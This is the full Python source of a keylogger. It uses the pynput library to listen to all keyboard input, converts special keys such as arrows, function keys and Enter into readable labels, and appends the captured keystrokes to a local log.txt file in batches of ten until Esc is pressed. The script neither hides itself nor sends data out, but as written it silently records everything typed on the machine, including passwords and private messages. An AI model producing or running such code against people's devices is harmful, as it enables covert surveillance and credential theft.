from pynput.keyboard import Key, Listener
import os

count = 0
keys = []

path = os.path.dirname(os.path.realpath(__file__)) + "/log.txt"
try:
    with open(path, "r") as _:
        pass
except:
    with open(path, "w") as _:
        pass

def parse_special(key):
    parts = key.split(".")
    if len(parts) == 1:
        if str(key) == "<269025067>":
            return "Function"
    elif len(parts) == 2:
        skey = parts[1].lower()
        if skey == "space":
            return " "
        if skey == "enter":
            return "\n"
        if skey == "ctrl_r":
            return "Right Control"
        if skey == "alt_r":
            return "Right Alt"
        if skey == "ctrl":
            return "Left Control"
        if skey == "alt":
            return "Left Alt"
        if skey == "<269025067>":
            return "Function"
        if skey == "print_screen":
            return "Print Screen"
        if skey == "up":
            return "Up Arrow"
        if skey == "down":
            return "Down Arrow"
        if skey == "left":
            return "Left Arrow"
        if skey == "right":
            return "Right Arrow"
        if skey.startswith('f') and len(skey) == 2:
            return "F" + skey[1]
        if skey == "page_up":
            return "Page Up"
        if skey == "page_down":
            return "Page Down"
        if skey == "home":
            return "Home"
        if skey == "end":
            return "End"
        if skey == "insert":
            return "Insert"
        if skey == "delete":
            return "Delete"
        return None


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")
    if count >= 10:
        write_file()
        keys = []

def write_file():
    with open(path, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.startswith("[[]"):
                key = k[3:]
                key = parse_special(key)
                if key is not None:
                    f.write("\n{} key released\n".format(key))
                continue
            special = parse_special(k)
            if special is not None:
                if special != "\n" and special != " ":
                    f.write("\n{} key pressed\n".format(special))
                else:
                    f.write(special)
            else:
                f.write(str(k))
            

def on_release(key):
    if key == Key.esc:
        write_file()
        return False
    else:
        print(str(key))
        k = str(key)
        special = parse_special(k)
        if special is not None:
            keys.append("[[]" + special)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()